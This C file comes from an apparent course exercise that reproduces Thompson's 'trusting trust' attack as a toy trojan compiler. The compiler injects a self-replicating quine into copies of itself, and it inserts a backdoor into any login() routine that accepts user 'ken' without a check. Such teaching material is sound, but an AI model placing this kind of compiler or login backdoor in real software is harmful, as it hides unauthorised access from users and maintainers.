// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>


#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)

// a not very interesting compile: throw the input into a 
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);
    fprintf(fp, "%s", program);
    fclose(fp);

    int compiled_compiler = 0;

    /*****************************************************************
     * Step 2:
     */
    
    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.

    char* compile_loc = strstr(program, compile_sig);

    #include "attack-quine.c"


    if (compile_loc) {
        FILE *fp = fopen("./temp-out.c", "w");
        assert(fp);

        char* char_ptr = program;
        
        while (char_ptr != compile_loc) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        char_ptr += strlen(compile_sig);
        fprintf(fp, "\n%s", compile_sig);
        fprintf(fp, "\n\t%s", compile_attack);
        
        while (char_ptr != program + strlen(program)) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }
        
        fclose(fp);
        compiled_compiler = 1;
        printf("OVERRIDING");
    }

 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";

    char* login_loc = strstr(program, login_sig);

    
    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    if (login_loc && !compiled_compiler) {
        FILE *fp = fopen("./temp-out.c", "w");
        assert(fp);

        char* char_ptr = program;
        
        while (char_ptr != login_loc) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        char_ptr += strlen(login_sig);
        fprintf(fp, "\n%s", login_sig);
        fprintf(fp, "\n\t%s", login_attack);

        while (char_ptr != program + strlen(program)) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        fclose(fp);
    }
    
    /************************************************************
     * don't modify the rest.
     */

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}



#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    printf("trojan\n");
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
